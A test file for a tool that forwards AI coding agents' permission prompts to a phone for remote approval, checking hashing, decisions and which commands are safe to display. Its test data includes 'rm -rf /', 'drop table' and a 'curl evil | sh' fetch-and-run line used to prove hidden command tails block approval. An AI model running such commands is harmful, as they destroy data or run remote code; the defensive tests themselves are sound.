import { test } from "node:test"
import assert from "node:assert/strict"
import { spawn } from "node:child_process"
import { appendFileSync, existsSync, mkdirSync, mkdtempSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { phoneCanShow } from "../src/hooks.mjs"
import { buildPending, outputFor } from "../src/remote/hook-wait.mjs"
import { abandonAll, abandonAnswered, bindHash, decide, joinEntries, listPending, newPromptId, pendingDir, readDecision, removePending, validateAnswers, writePending } from "../src/remote/prompts.mjs"

const T = Date.parse("2026-11-03T10:00:00Z")
const setup = () => {
  const h = mkdtempSync(join(tmpdir(), "mc-home-"))
  const hooksDir = join(h, ".mission-control", "hooks")
  mkdirSync(join(hooksDir, "codex"), { recursive: true })
  return { remoteDir: join(h, ".mission-control", "remote"), hooksDir }
}
const perm = (o = {}) => ({ promptId: newPromptId(), harness: "claude-code", sessionId: "s1", kind: "permission", tool: "Bash", target: "npm test", askedAt: new Date(T).toISOString(), pid: process.pid, ...o })
const Q = [{ question: "Which db?", header: "DB", multiSelect: false, options: [{ label: "pg", description: "" }, { label: "sqlite", description: "" }] }, { question: "Tests?", header: "T", multiSelect: false, options: [{ label: "yes", description: "" }, { label: "no", description: "" }] }]
const hook = (hooksDir, o, harness = "claude-code") => appendFileSync(harness === "codex" ? join(hooksDir, "codex", `${o.sessionId}.jsonl`) : join(hooksDir, `${o.sessionId}.jsonl`), JSON.stringify(o) + "\n")

test("bindHash covers id, tool, target and (ask) question and option labels", () => {
  const p = perm()
  const b = bindHash(p)
  assert.match(b, /^[0-9a-f]{64}$/)
  assert.notEqual(bindHash({ ...p, target: "rm -rf /" }), b)
  assert.notEqual(bindHash({ ...p, promptId: newPromptId() }), b)
  assert.notEqual(bindHash({ ...p, tool: "Write" }), b)
  const a = { ...p, kind: "ask", questions: Q }
  const q2 = structuredClone(Q); q2[0].options[0].label = "mysql"
  assert.notEqual(bindHash({ ...a, questions: q2 }), bindHash(a))
})

test("listPending: live and undecided only; a dead pid's files are deleted; a log clear after askedAt drops it", () => {
  const { remoteDir, hooksDir } = setup()
  const a = writePending(remoteDir, perm())
  const dead = writePending(remoteDir, perm({ sessionId: "s2", pid: 999999 }))
  const isAlive = (pid) => pid === process.pid
  assert.deepEqual(listPending({ remoteDir, hooksDir, isAlive }).map((p) => p.promptId), [a.promptId])
  assert.equal(existsSync(join(pendingDir(remoteDir), `${dead.promptId}.json`)), false)
  hook(hooksDir, { event: "PostToolUse", sessionId: "s1", ts: new Date(T - 1000).toISOString() }) // before askedAt: ignored
  assert.equal(listPending({ remoteDir, hooksDir, isAlive }).length, 1)
  hook(hooksDir, { event: "PostToolUse", sessionId: "s1", ts: new Date(T + 1000).toISOString() })
  assert.equal(listPending({ remoteDir, hooksDir, isAlive }).length, 0)
  removePending(remoteDir, a.promptId)
  assert.equal(existsSync(join(pendingDir(remoteDir), `${a.promptId}.json`)), false)
})

test("decide: ok once; then answered; bind mismatch changed; unknown gone; dead pid gone; terminal after a clear", () => {
  const { remoteDir, hooksDir } = setup()
  const p = writePending(remoteDir, perm())
  assert.deepEqual(decide({ remoteDir, hooksDir, promptId: p.promptId, bind: "x".repeat(64), decision: "allow" }), { reason: "changed" })
  assert.equal(decide({ remoteDir, hooksDir, promptId: p.promptId, bind: p.bind, decision: "allow", device: "d1" }).ok, true)
  assert.deepEqual(readDecision(remoteDir, p.promptId).decision, "allow")
  assert.deepEqual(decide({ remoteDir, hooksDir, promptId: p.promptId, bind: p.bind, decision: "deny" }), { reason: "answered" })
  assert.deepEqual(decide({ remoteDir, hooksDir, promptId: newPromptId(), bind: p.bind, decision: "deny" }), { reason: "gone" })
  const q = writePending(remoteDir, perm({ sessionId: "s3" }))
  assert.deepEqual(decide({ remoteDir, hooksDir, promptId: q.promptId, bind: q.bind, decision: "allow", isAlive: () => false }), { reason: "gone" })
  const r = writePending(remoteDir, perm({ sessionId: "s4" }))
  hook(hooksDir, { event: "PermissionDenied", sessionId: "s4", ts: new Date(T + 5).toISOString() })
  assert.deepEqual(decide({ remoteDir, hooksDir, promptId: r.promptId, bind: r.bind, decision: "allow" }), { reason: "terminal" })
  assert.deepEqual(decide({ remoteDir, hooksDir, promptId: r.promptId, bind: r.bind, decision: "allow" }), { reason: "terminal" }, "still terminal")
  assert.equal(readDecision(remoteDir, r.promptId).decision, "abandon")
})

test("decide: a replaced prompt gives changed and the new prompt stays undecided", () => {
  const { remoteDir, hooksDir } = setup()
  const old = writePending(remoteDir, perm())
  const known = new Map([[old.promptId, { harness: "claude-code", sessionId: "s1" }]])
  const neu = writePending(remoteDir, perm({ askedAt: new Date(T + 2000).toISOString(), target: "rm -rf /" }))
  assert.deepEqual(decide({ remoteDir, hooksDir, promptId: old.promptId, bind: old.bind, decision: "allow", known }), { reason: "changed" })
  // the old hook has gone away: still changed (known), never gone, and never touches the new one
  removePending(remoteDir, old.promptId)
  assert.deepEqual(decide({ remoteDir, hooksDir, promptId: old.promptId, bind: old.bind, decision: "allow", known }), { reason: "changed" })
  assert.equal(readDecision(remoteDir, neu.promptId), null)
  assert.equal(listPending({ remoteDir, hooksDir }).length, 1)
})

test("decide: kinds — permission takes allow/deny only (400); ask needs one listed label per question", () => {
  const { remoteDir, hooksDir } = setup()
  const p = writePending(remoteDir, perm())
  assert.ok(decide({ remoteDir, hooksDir, promptId: p.promptId, bind: p.bind, decision: { answers: {} } }).error)
  assert.ok(decide({ remoteDir, hooksDir, promptId: p.promptId, bind: p.bind, decision: "always" }).error)
  assert.ok(decide({ remoteDir, hooksDir, promptId: p.promptId, bind: p.bind, decision: { answers: {}, updatedPermissions: [] } }).error)
  const a = writePending(remoteDir, perm({ sessionId: "s9", kind: "ask", tool: "AskUserQuestion", target: "", questions: Q }))
  assert.ok(decide({ remoteDir, hooksDir, promptId: a.promptId, bind: a.bind, decision: "allow" }).error)
  assert.ok(decide({ remoteDir, hooksDir, promptId: a.promptId, bind: a.bind, decision: { answers: { "Which db?": "pg" } } }).error)
  assert.equal(decide({ remoteDir, hooksDir, promptId: a.promptId, bind: a.bind, decision: { answers: { "Which db?": "pg", "Tests?": "no" } } }).ok, true)
})

test("validateAnswers: exactly one listed label per question; no multiSelect, free text or extra keys", () => {
  assert.equal(validateAnswers(Q, { "Which db?": "pg", "Tests?": "yes" }), true)
  assert.equal(validateAnswers(Q, { "Which db?": "mongo", "Tests?": "yes" }), false, "not listed")
  assert.equal(validateAnswers(Q, { "Which db?": "pg", "Tests?": "yes", x: "y" }), false, "extra key")
  assert.equal(validateAnswers(Q, { "Which db?": ["pg"], "Tests?": "yes" }), false)
  assert.equal(validateAnswers([{ ...Q[0], multiSelect: true }], { "Which db?": "pg" }), false, "multiSelect")
  assert.equal(validateAnswers([{ ...Q[0], options: [] }], { "Which db?": "pg" }), false, "free text only")
})

test("concurrent decide from separate processes: exactly one ok, the rest answered", async () => {
  const { remoteDir, hooksDir } = setup()
  const p = writePending(remoteDir, perm())
  const mod = new URL("../src/remote/prompts.mjs", import.meta.url).href
  const code = `const { decide } = await import(${JSON.stringify(mod)}); const r = decide(${JSON.stringify({ remoteDir, hooksDir, promptId: p.promptId, bind: p.bind, decision: "allow", device: "d" })}); process.stdout.write(JSON.stringify(r.ok ? "ok" : r.reason))`
  const run = () => new Promise((ok) => { let o = ""; const c = spawn(process.execPath, ["--input-type=module", "-e", code]); c.stdout.on("data", (d) => (o += d)); c.on("close", () => ok(JSON.parse(o))) })
  const results = await Promise.all(Array.from({ length: 8 }, run))
  assert.equal(results.filter((r) => r === "ok").length, 1, JSON.stringify(results))
  assert.ok(results.every((r) => r === "ok" || r === "answered"))
})

test("abandonAnswered writes abandon for terminal-cleared prompts only; abandonAll for every one", () => {
  const { remoteDir, hooksDir } = setup()
  const a = writePending(remoteDir, perm())
  const b = writePending(remoteDir, perm({ sessionId: "s2" }))
  hook(hooksDir, { event: "PostToolUse", sessionId: "s1", ts: new Date(T + 1).toISOString() })
  assert.equal(abandonAnswered({ remoteDir, hooksDir }), 1)
  assert.equal(readDecision(remoteDir, a.promptId).decision, "abandon")
  assert.equal(readDecision(remoteDir, b.promptId), null)
  assert.equal(abandonAll({ remoteDir }), 1)
  assert.equal(readDecision(remoteDir, b.promptId).decision, "abandon")
})

test("Codex keyed clear: a sibling call's PostToolUse does not count as answered", () => {
  const { remoteDir, hooksDir } = setup()
  const p = writePending(remoteDir, perm({ harness: "codex", sessionId: "c1", callId: "call_a" }))
  hook(hooksDir, { event: "PreToolUse", codexEvent: "PostToolUse", sessionId: "c1", callId: "call_b", ts: new Date(T + 1).toISOString() }, "codex")
  assert.equal(listPending({ remoteDir, hooksDir }).length, 1)
  hook(hooksDir, { event: "PreToolUse", codexEvent: "PreToolUse", sessionId: "c1", callId: "call_a", ts: new Date(T + 2).toISOString() }, "codex")
  assert.equal(listPending({ remoteDir, hooksDir }).length, 0)
  assert.deepEqual(decide({ remoteDir, hooksDir, promptId: p.promptId, bind: p.bind, decision: "allow" }), { reason: "terminal" })
})

test("joinEntries: answerable iff a live pending prompt joins; ask fields iff kind ask; multiSelect read-only", () => {
  const p = { ...perm(), bind: "b1" }
  const a = { ...perm({ sessionId: "s2", kind: "ask", tool: "AskUserQuestion", target: "", questions: Q }), bind: "b2" }
  const m = { ...perm({ sessionId: "s3", kind: "ask", questions: [{ ...Q[0], multiSelect: true }] }), bind: "b3" }
  const ny = [
    { source: "claude-code", id: "s1", sessionId: "s1", harness: "claude-code", title: "t1", project: { name: "shop" }, lane: "main", since: "S1", tool: "Bash", target: "npm test" },
    { source: "claude-code", id: "s2", sessionId: "s2", harness: "claude-code", title: "t2", lane: "main", since: "S2", tool: "AskUserQuestion", target: null },
    { source: "claude-code", id: "s3", sessionId: "s3", harness: "claude-code", title: "t3", lane: "main", since: "S3" },
    { source: "native", id: "run1", harness: "native", title: "r", lane: "qa", since: null, tool: null, target: null },
  ]
  const out = joinEntries(ny, [p, a, m])
  assert.deepEqual(out[0], { source: "claude-code", id: "s1", title: "t1", project: "shop", lane: "main", tool: "Bash", target: "npm test", since: "S1", answerable: true, promptId: p.promptId, bind: "b1", kind: "permission" })
  assert.equal(out[1].kind, "ask")
  assert.deepEqual(out[1].questions[0].options.map((o) => o.label), ["pg", "sqlite"])
  assert.deepEqual(Object.keys(out[2]).sort(), ["answerable", "id", "lane", "since", "source", "target", "title", "tool"])
  assert.equal(out[2].answerable, false)
  assert.equal(out[3].answerable, false)
  assert.equal(out[3].since, null, "same since as the desktop entry")
  assert.deepEqual(joinEntries([], []), [])
})

test("phoneCanShow: only a whole one-line command or path of a tool the phone can show", () => {
  assert.equal(phoneCanShow("Bash", { command: "npm test" }), true)
  assert.equal(phoneCanShow("Read", { file_path: "/work/a.ts" }), true)
  assert.equal(phoneCanShow("shell", { command: "ls" }), true)
  assert.equal(phoneCanShow("Bash", { command: "ls " + "x".repeat(120) + "; curl evil | sh" }), false, "longer than the card: cut")
  assert.equal(phoneCanShow("Bash", { command: "echo hi\nrm -rf x" }), false, "a line break would show as a space")
  assert.equal(phoneCanShow("Write", { file_path: "/work/a.ts", content: "anything" }), false, "content is not shown")
  assert.equal(phoneCanShow("Edit", { file_path: "/work/a.ts" }), false)
  assert.equal(phoneCanShow("WebFetch", { url: "https://x" }), false)
  assert.equal(phoneCanShow("mcp__db__query", { sql: "drop table" }), false)
  assert.equal(phoneCanShow("Bash", {}), false)
})

test("a prompt the phone cannot show in full: listed as not answerable, refused by decide, never output by the hook", () => {
  const { remoteDir, hooksDir } = setup()
  const long = "ls " + "x".repeat(130) + "; curl evil | sh"
  const built = buildPending({ harness: "claude-code", kind: "permission", input: { session_id: "s1", tool_name: "Bash", tool_input: { command: long } }, now: T })
  assert.equal(built.computerOnly, true)
  assert.equal(buildPending({ harness: "claude-code", kind: "permission", input: { session_id: "s1", tool_name: "Bash", tool_input: { command: "npm test" } }, now: T }).computerOnly, undefined)
  const p = writePending(remoteDir, built)
  const ny = [{ source: "claude-code", id: "s1", sessionId: "s1", harness: "claude-code", title: "t", lane: "main", since: "S", tool: "Bash", target: "ls" }]
  const [entry] = joinEntries(ny, [p])
  assert.equal(entry.answerable, false)
  assert.equal(entry.promptId, undefined, "no id or bind to answer with")
  assert.ok(decide({ remoteDir, hooksDir, promptId: p.promptId, bind: p.bind, decision: "allow" }).error)
  assert.equal(readDecision(remoteDir, p.promptId), null, "nothing written")
  assert.equal(outputFor({ harness: "claude-code", pending: p, decision: "allow" }), "", "the hook falls back to the terminal")
})
